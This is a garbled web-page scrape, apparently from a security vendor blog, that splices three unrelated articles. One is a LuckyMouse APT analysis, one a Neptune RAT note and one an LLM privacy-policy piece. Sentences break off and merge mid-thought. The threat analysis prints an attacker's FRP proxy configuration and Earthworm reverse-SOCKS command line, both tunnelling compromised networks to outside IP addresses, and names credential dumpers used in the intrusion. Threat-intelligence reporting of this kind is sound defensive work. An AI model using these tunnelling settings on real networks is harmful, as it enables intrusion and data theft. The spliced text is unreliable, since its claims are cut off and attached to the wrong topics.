srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-5.png.webp?itok=S99mcGBv 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-5.png.webp?itok=7qm6F20m 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-5.png.webp?itok=Vpq8Xs-w 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-5.png.webp?itok=Oyb5dSuK 2x" media="(min-width: 420px)"/><img Command data parsing" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 7: Command data parsing</div></div><div class="RichText_wrapper__xZRh7"><p>The AES encryption key is derived from the first packet of each new command received from the C&amp;C server, using the algorithm below:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-6.png.webp?itok=ysuWnwXS 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-6.png.webp?itok=bpgQVlgb 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-6.png.webp?itok=RYfdqQ9G 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-6.png.webp?itok=MJgH5ShM 2x" media="(min-width: 720px)"/><source Encryption key computation" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 8: Encryption key computation</div></div><div class="RichText_wrapper__xZRh7"><p>The sample checks for a proxy configured on the system found in the Registry Key <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable. </em>If a proxy is configured it uses the server specified in <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer </em>for all the connections.&nbsp;</p><h4><strong>Polpo – Functionality</strong></h4><p>There are more than 15 commands supported by the backdoor, although some of them are duplicates. Most of the commands are executed in separate threads. Errors and inter-thread communication are handled using Events.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-7.png.webp?itok=EfleUvKw 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-7.png.webp?itok=UimwT7KX 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-7.png.webp?itok=sqH5Yclc 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-7.png.webp?itok=R1bXF2Qg 2x" media="(min-width: 720px)"/><source Command dispatcher" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 9: Command dispatcher</div></div><div class="RichText_wrapper__xZRh7"><p>These commands are supported by the version of Polpo we’ve analyzed:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.19.56%E2%80%AFAM.png.webp?itok=CxcppXdt 1x, media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.19.56%E2%80%AFAM.png.webp?itok=q3FiikHL" width="100%" height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><h2><strong>UAC bypass tool</strong></h2><p>An open-source UAC bypass tool (<a href="https://github.com/vestjoe/WinPwnage#uac-bypass-techniques">https://github.com/vestjoe/WinPwnage</a>) was detected on several compromised devices. It may be used to elevate privileges or achieve persistence on the system. We presume that it was used to execute tasks and programs under administrator-level permissions.&nbsp;</p><h2><strong>Port-scanners</strong></h2><p>Several different port scanners were seen on compromised devices under various filenames. One of the used port scanners was open-source <a href="https://github.com/kingron/s">https://github.com/kingron/s</a>. We assume that in this case it was used for scanning the ports of the server to find out which services were running.</p><h2><strong>Nbtscan</strong></h2><p>Nbtscan is a command-line NetBIOS scanner for Windows that scans for open NetBIOS name servers in the network.</p><h2><strong>Passwords dumpers</strong></h2><p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> and <a href="https://github.com/AlessandroZ/LaZagne">Lazagne</a> were seen on the infected computers. We presume that they were used to retrieve credentials from the compromised computers. We’ve also spotted a wrapped Mimikatz version, download from <a href="https://github.com/jas502n/mimikat_ssp">https://github.com/jas502n/mimikat_ssp</a>, on several compromised devices.</p><h2><strong>FRP</strong></h2><p>Fast Reverse Proxy (FRP) is a tool that allows you to expose local services that are hidden behind the NAT or a firewall to the internet. Both the raw TCP and UDP are supported as well as several other protocols whose requests can be forwarded to the internal services via this proxy. We’ve recovered a configuration file <em>3bef4cd.tmp</em> for this proxy. The content of this proxy is the following:</p><p>[common]<br>server_addr = 202.59.9[.]58<br>server_port = 8443<br>privilege_token = %token%<br>[SDJY_proxy]<br>type = tcp<br>remote_port = 6001<br>plugin = socks5</p><p>It is immediately obvious that the actor used the SOCKS5 plugin to route requests to the compromised network via 202.59.9[.]58:8443.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/FRP_graph.png.webp?itok=FlbsrLM4 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/FRP_graph.png.webp?itok=u929aPYO 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/FRP_graph.png.webp?itok=RRBnM_h8 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/FRP_graph.png.webp?itok=krp3kRkN 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/FRP_graph.png.webp?itok=pdFuuMia 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/FRP_graph.png.webp?itok=rrfPYi2N 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/FRP_graph.png.webp?itok=pdFuuMia" width="100%" height="unset" alt="Figure 10: Diagram of FRP tool usage" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 10: Diagram of FRP tool usage</div></div><div class="RichText_wrapper__xZRh7"><h2><strong>Earthworm tunneler</strong></h2><p>The Earthworm tunneler is considered to be a typical tool for Chinese-speaking actors by Kaspersky[1]. We’ve seen this tool on all compromised systems of national data center. On one of these devices, we’ve managed to recover command-line parameters that were used:&nbsp; <em>-s rssocks -d 139.180.155.133 -e 80</em>. The tool itself creates a SOCKS tunnel to the provided server. It is publically available at <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>.</p><h2><strong>Conclusions</strong></h2><p>As this blogpost demonstrates, LuckyMouse has used new methods to infiltrate the government institution through a third party’s system which they attacked.&nbsp;</p><p>Avast has recently protected users in the government institution and national data center from further attacks using the samples we analyzed. We also discovered an interesting encryption method that delivers a hidden IP address in the whitespace of the C&amp;C response. We presume that the attackers updated their attacking toolset in this campaign after it was discovered by Avast.</p><p>I would like to thank Adolf Středa, David Zimmer and Anh Ho for helping me with this research.</p><h2><strong>Indicators of Compromise (IoC)</strong></h2><ul><li>&nbsp;Repository:&nbsp;<a href="https://github.com/avast/ioc/tree/master/LuckyMouse">https://github.com/avast/ioc/tree/master/</a></li><li> List of SHA-256:&nbsp;<a href="https://github.com/avast/ioc/blob/master/LuckyMouse/samples.sha256">https://github.com/avast/ioc/blob/master/</a></li></ul><h2><strong>MITRE ATT&amp;CK techniques</strong></h2></div><div We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.\u003c/p\u003e\u003cp\u003eAccording to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThere are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eAttribution \u0026amp; Clusterization\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e][\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (\u003cem\u003eIntgStat.exe\u003c/em\u003e). This is a legitimate application that loads a DLL \u003cem\u003epcalocalresloader.dll\u003c/em\u003e. By sideloading their own version \u003cem\u003epcalocalresloader.dll\u003c/em\u003e, they load HyperBro RAT from a compressed and encrypted file\u003cem\u003e thumbs.db\u003c/em\u003e. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application \u003cem\u003ethinprobe.exe\u003c/em\u003e that loads \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e. This DLL was then used to sideload \u003cem\u003ethumb.db\u003c/em\u003e that contained encrypted and compressed HyperBro[\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eWe’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eInfection Chain\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.\u003c/p\u003e\u003cp\u003eDate: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)\u0026nbsp;\u003cbr\u003eSubject: Re: Perform a firmware update on the server\u003c/p\u003e\u003cp\u003eXXXXXX_update.exe\u0026nbsp;\u003c/p\u003e\u003cp\u003e(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)\u003c/p\u003e\u003cp\u003eThis archive drops three already familiar files – Symantec’s \u003cem\u003ethinprobe.exe\u003c/em\u003e, malicious \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e, and \u003cem\u003ethumb.db\u003c/em\u003e. \u003cem\u003eNeptuneRatV2\u003c/em\u003e, which contains a trial version of a new builder that we’ll refer to as V2. Its initial commit dates to February 22, 2025, with GitHub showing ongoing development in the original, now-private repository. While the V2 builder’s UI appears to be a reskinned and more polished version of V1, the underlying code has undergone significant changes, suggesting either a complete rewrite or an extensive refactoring.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2025-07/image14.png.webp?itok=X0fc_ru6 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2025-07/image14.png.webp?itok=CdnPArwX 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":478},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2025-07/image14.png.webp?itok=wV_c3KMG 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2025-07/image14.png.webp?itok=bwD6OqwZ 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":363},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-07/image14.png.webp?itok=jmnrhQqa 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2025-07/image14.png.webp?itok=a8F13zL0 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":282}],"caption":" Main function of Neptune RAT V2","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-07/image14.png.webp?itok=jmnrhQqa","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eNeptune RAT V2 shows a drastic departure from V1. While V1 completed configuration initialization within the main function, V2 follows a completely different code flow. OSINT investigations uncovered some tentative connections, including forks of the \u003cem\u003eMasonGroup/NeptuneRatV1\u003c/em\u003e repository. Although the original repository is no longer accessible, these forks contained code heavily overlapping with XWORM. Notably, the current Neptune RAT builder references the Freemasonry group, aligning with the Discord server identified in our research.\u003c/p\u003e\u003cp\u003eReverse engineering Neptune RAT V1 revealed further compelling similarities. While the shared resource structure might be dismissed as a coincidence, given that many .NET RATs use similar frameworks, the resource encryption scheme is essentially identical in both: AES encryption in insecure ECB mode combined with the same key-derivation method using a hard-coded mutex. Their persistence mechanisms are also functionally and structurally alike. Additionally, the clipper functionality employs the same regular expressions and targets the same cryptocurrencies. Although these expressions focus on legacy Bitcoin addresses rather than newer standards like Bech32, this link is somewhat weak given the widespread use of these expressions in malware.\u003c/p\u003e\u003cp\u003eThe strong similarities between XWORM and Neptune RAT V1, contrasted with their clear divergence from other open-source RATs, strongly suggest that Neptune RAT V1 is related to XWORM. However, these parallels do not extend to Neptune RAT V2, whose trial version, while functionally similar to V1, appears to be a complete code rewrite.\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eList of lang=\"EN-US\"\u003eLarge language models (LLMs) are everywhere. Since OpenAI’s ChatGPT burst onto the scene a few years ago, these tools have completely reshaped how we search, ask questions and navigate the web. They have quickly woven themselves into our daily routines, helping us build grocery lists, find restaurant recommendations and even plan entire vacations.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eAnd all of this? It seems to come at no cost. Just create an account and start using platforms like ChatGPT (OpenAI), Gemini (Google) or DeepSeek. But that leads us to an important question: are these tools truly free? And if not, what is the real price we are paying?\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eTo find out, we dug into the privacy policies of the top AI platforms, so you do not have to. Here is what we uncovered about the actual cost of using today’s most popular LLMs.\u0026nbsp;\u003c/p\u003e\u003ch2\u003ePrivacy by design, and other nice stories\u0026nbsp;\u003c/h2\u003e\u003cp lang=\"EN-US\"\u003eLet’s walk through a familiar scenario: planning your next vacation. Like many of us, you want the perfect destination, at the perfect time, all within a specific budget. That means searching for cheap flights, affordable hotels and ideally, something close to the city center that still feels like a getaway.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eIn the past, you might have spent hours, or days, browsing search engines, comparing options, reading reviews and hunting for deals. It is time-consuming and, frankly, a bit overwhelming.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eBut now? Who has time for all that? More importantly – why bother when your friendly AI assistant can handle it for you? All you need to do is head to your favorite large language model and type in a well-crafted prompt:\u0026nbsp;\u003c/p\u003e\u003cp\u003e“Hello, I want to go for vacation on august somewhere sunny. I would like a beautiful island somewhere in the Mediterranean Sea with plenty of activities and tasty food. I do not want it to be too crowded and not extremely expensive. Find me also flights from Oslo to this destination that are cheap or tell me which dates I should look for. Finally, find me a nice hotel 3 stars and above with a room for 2 adults and 2 kids. Find something that is bellow 150 euros per day with availability for 6 days, please.”\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eWith a prompt like that, the model gets to work. Within seconds, it returns tailored recommendations that check all your boxes. Even better? It might offer to book the flights and hotel for you – asking for your credit card and passport details so you don’t have to lift a finger. Just sit back, relax and dream of sun-drenched beaches.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eYou may even notice a few quick notifications as the system says things like “memory updated”, but nothing else seems to change, so no need to worry… right?\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eLet’s take a moment to unpack what happened behind the scenes.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eWhen we typed our prompt, the model did not just give us a list of results – it broke down our request into smaller, more specific queries. It recognized that we are planning a vacation, live in Oslo, have a partner and two kids, prefer nice hotels, and are working with a budget of €150 per night. Piece by piece, it started building a profile of who we are and what we like.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eThat profile does not just disappear. It is often stored, somewhere.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eAnd if we take a closer look at the privacy policies of major AI providers, we start to see how that information can be used. So, let’s break it down: what exactly is being collected, and how is it being used?\u0026nbsp;\u003c/p\u003e\u003ch2\u003eChatGPT by OpenAI\u0026nbsp;\u003c/h2\u003e\u003cp lang=\"EN-US\"\u003eLet’s start with the elephant in the room: OpenAI, the most popular and widely used large language model provider.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eAccording to its privacy policy, OpenAI collects a wide range of personal data. This includes:\u0026nbsp;\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eAccount information\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eUser content (everything you type)\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eCommunication details\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eOther information you voluntarily provide\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eLog data and usage patterns\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eDevice and location data\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eCookies and similar tracking technologies\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eInformation received from third-party sources\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp lang=\"EN-US\"\u003eIn short: it is not just your prompts that are being collected. It is your device, your location, how you interact with the model and even data that can be bought or received from other sources.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eBut what is even more important than what is collected is how it is used. OpenAI states that this data helps them “provide, analyze and maintain” their services, “improve and develop” new features, “communicate with users” and “prevent misuse or fraud.” All of which sound standard, until you read the fine print about data sharing.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eAccording to the policy, OpenAI may share your information, with broad discretion, for purposes such as:\u0026nbsp;\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eStrategic transactions (e.g., mergers or acquisitions)\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eBusiness operations\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eLegal compliance\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp lang=\"EN-US\"\u003eAnd more vaguely, with “affiliates”\u0026nbsp;\u003c/p\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp lang=\"EN-US\"\u003eSo, what does this mean in practice?\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eOnce you provide your data, it is no longer truly yours. It can be used to train future models, shared with business partners or even leveraged in a corporate acquisition. And the kicker? This applies whether you are a free user or a paying subscriber.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eYour data powers the system, but it does not belong to you anymore.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eGemini by Google\u0026nbsp;\u003c/h2\u003e\u003cp\u003eNext, let’s look at how the most popular search engine’s AI model, Gemini by Google, handles user privacy. Unsurprisingly, the situation is very similar to what we saw with OpenAI.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eGemini collects not just your chats and interactions, but also any files, images or browser page content you share. It logs your location, IP address, submitted feedback and even physical addresses, like home or work, if they are part of your input.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eWhen it comes to how this data is used, the language is broad and vague. Google states that your data helps them “provide, improve, develop and personalize” their services and machine learning technologies. But if you dig deeper into their multi-layered privacy policy, a clearer picture emerges: your personal information can also be used for targeted advertising and to make recommendations for other Google products.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eAnd it gets more concerning.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eGoogle explicitly warns users not to share personal or confidential data in Gemini chats. Why? Because human reviewers, known as annotators, may read your conversations, access your files and use that data to improve future model performance. So, not only does your data no longer belong to you; it may also be read and evaluated by actual people.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eOnce again, it does not matter whether you are a free user or a paid subscriber. The privacy terms apply across the board. From the moment you interact with Gemini, your data becomes part of its ecosystem.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eDeepSeek: The new kid on the block\u0026nbsp;\u003c/h2\u003e\u003cp lang=\"EN-US\"\u003eFinally, we reviewed the privacy policy of DeepSeek, a platform that gained major traction last year after claiming OpenAI-level performance with just a fraction of the resources. It quickly rose in popularity, eventually topping Apple’s App Store charts.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eDeepSeek’s privacy policy appears standard. They collect personal data associated with your account, your input and any details you provide when contacting them. But as with the other major players, a deeper dive reveals a long list of data points they track device model, IP address, identifiers, location, cookies, payment details, text inputs, uploaded files, chat history, user age, contact information and more.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eWhere things get even more concerning is where your data goes.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eUnlike OpenAI or Google, DeepSeek transfers user data from Europe and the U.S. to servers in China, placing it under Chinese authority. This means your information is no longer protected by EU or U.S. privacy laws. According to Chinese regulations, the government may access or request user data at any time, for any reason – with little transparency or recourse.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eAs for how the data is used, the story remains familiar. DeepSeek claims your information helps them improve, develop and train their models, whether by feeding prompts directly into training datasets or by analyzing usage patterns. They also cite compliance with legal obligations and protecting the “interests of users and others”, though who those “others” are is never clearly defined.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eAnd, of course, they reserve the right to share your personal data with third-party partners who help operate or develop their services.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eThe bottom line? No matter which platform you choose, your data stops being just yours the moment you use the service.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eHow privacy has changed\u0026nbsp;\u003c/h2\u003e\u003cp lang=\"EN-US\"\u003eSome might argue that privacy concerns are not new, we have been sharing data online long before large language models (LLMs) took over. After all, even planning a vacation used to involve multiple search queries typed into our favorite search engine. So, what is the difference?\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eThat argument seems fair. But there is a key distinction.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eBefore LLMs, we were in control. Searching for cheap flights or hotel deals meant navigating between websites of our choosing. We could decide which platforms to interact with, and, at least to some extent, who saw our data. Tools like \u003ca href=\"https://us.norton.com/products/norton-antitrack\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eNorton AntiTrack\u003c/a\u003e made it possible to keep trackers at bay, allowing us to interact directly with service providers while limiting what the search engine itself could collect.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eNow, that dynamic has shifted.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eWhen we use LLMs, the model is not just answering a question, it is becoming the gateway to everything. It decides which services to show, which sources to pull from and how to summarize or filter the information. You no longer browse freely; you are handed a curated response. And in the process, the LLM provider sees everything, from your preferences and prompts to your files, location and interactions.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eEven more troubling? You cannot always tell which sources were used or whether the results are truly in your best interest.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eSo, does this mean privacy is a lost game in the age of LLMs?\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eThe answer is not simple.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eCountermeasures\u0026nbsp;\u003c/h2\u003e\u003cp lang=\"EN-US\"\u003eUnfortunately, there is no silver bullet when it comes to protecting your privacy while using large language models. But that does not mean you are completely powerless; there are a few settings and habits that can help minimize your data exposure. Let’s take a closer look at what is possible, starting with the most popular platform:\u003c/p\u003e\u003ch3\u003eChatGPT by OpenAI\u0026nbsp;\u003c/h3\u003e\u003cp lang=\"EN-US\"\u003eIn OpenAI’s ChatGPT, privacy-conscious users can adjust a few settings to gain more control over how their data is used. To access them, click on your avatar in the top right corner and open Settings. From there, navigate to the Data Controls tab, where you can toggle off “Improve the model for everyone.” This setting tells OpenAI not to use your chats to train future models.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eYou can also visit the Personalization tab and disable memory features to stop the model from saving and recalling information about you. If you are curious about what the model has already learned, click “Manage Memories” to review and delete anything it has inferred.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eKeep in mind, disabling memory means a less personalized experience, so you may receive less accurate or relevant responses to your prompts. And unfortunately, this does not mean you are fully in the clear: even with all settings turned off, the personal and sensitive information you share may still be collected and stored by OpenAI.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eBottom line: these settings offer a degree of control, but not full privacy.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eGemini by Google\u0026nbsp;\u003c/h3\u003e\u003cp lang=\"EN-US\"\u003eWith Gemini, your options to control privacy are a bit more limited. The main setting available is found by clicking on Activity in the bottom left panel, where you can disable it. However, this does not mean your data will not be stored or processed, it only means that human reviewers will not inspect the information you share.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eGemini’s privacy policy does not explicitly say whether your data is still used to train models without human review, so it remains unclear if your chats contribute to future model training behind the scenes.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eUnlike ChatGPT, Gemini does not automatically infer information about you. Instead, the model only learns personal details if you explicitly provide them. If you want to delete stored information, you can either switch off Activity altogether or delete entries individually within the same tab.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eStill, there is no true way to avoid sharing data with Google, and once you share your information, it no longer belongs to you.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eDeepSeek\u0026nbsp;\u003c/h3\u003e\u003cp lang=\"EN-US\"\u003eThe situation with DeepSeek is a bit grimmer. If you click the bottom left corner and then go to Settings, you will find the Profile tab. Here, the only privacy control available is the option to switch off “Improve model for everyone.”\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eDeepSeek claims that they do not use your content to train their models if you disable this setting, but beyond that, their policy is vague and unclear. What is clear, however, is that once you share your data, it no longer truly belongs to you.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eWhat does the future bring?\u0026nbsp;\u003c/h2\u003e\u003cp lang=\"EN-US\"\u003eAI-powered services like these are here to stay, and they simply cannot operate without the vast amounts of data generated by their users. For now, there are few regulations or safeguards to limit how this data is collected, stored or used, which means privacy is taking a backseat.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eUntil stronger protections are put in place, the responsibility falls on users to safeguard their own sensitive information. That means sharing as little personal 